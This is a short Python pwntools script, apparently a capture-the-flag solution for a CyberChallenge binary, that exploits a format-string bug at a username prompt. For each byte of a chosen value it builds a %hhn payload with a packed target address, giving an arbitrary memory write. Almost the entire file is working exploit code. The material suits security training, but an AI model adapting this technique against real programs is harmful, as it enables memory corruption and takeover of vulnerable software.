from pwn import *

context.terminal = ["konsole", "-e"]

# r = remote("cyberchallenge.disi.unitn.it", 9006)
r = process("./bin")
# r = gdb.debug("./bin")

address = 0x000000000040408c
value = 0xdeadbeef
log.info(f"Trying to write {hex(value)} to {hex(address)}...")


value = [int(a) for a in value.to_bytes(4, "little")]
# 6: offset of the first argument
fmt_offset = 8

for i, byte in enumerate(value):
    payload = f"%{byte}c%{fmt_offset + 2}$hhn".encode()
    payload += b" " * (16 - len(payload))
    payload += p64(address + i)

    log.info(f"Sending payload: {payload}")

    r.sendlineafter(
        b"username: ",
        payload
    )

    if i < len(value) - 1:
        output = r.recvuntil(b'\n\n').decode(errors="ignore")
        print(output)

print(r.recvall().decode(errors="ignore"))